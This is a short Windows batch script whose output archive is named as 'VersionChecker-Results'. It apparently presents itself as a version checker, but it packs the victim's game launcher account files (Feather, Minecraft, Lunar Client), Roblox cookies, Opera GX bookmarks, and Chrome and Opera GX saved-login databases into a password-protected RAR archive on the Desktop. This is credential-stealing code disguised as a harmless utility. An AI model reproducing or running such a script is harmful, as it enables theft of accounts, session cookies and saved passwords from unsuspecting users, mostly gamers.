@echo off
setlocal

"C:\Program Files\WinRAR\Rar.exe" a -hp"sprawdzanie132137" "C:\Users\%USERNAME%\Desktop\VersionChecker-Results.rar" "%appdata%\.feather\accounts.json" "%appdata%\.minecraft\launcher_accounts_microsoft_store.json" "C:\Users\%USERNAME%\.lunarclient\settings\game\accounts.json" "%LOCALAPPDATA%\Roblox\LocalStorage\RobloxCookies.dat" "%appdata%\Opera Software\Opera GX Stable\Bookmarks" "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" "%appdata%\Opera Software\Opera GX Stable\Login Data"

endlocal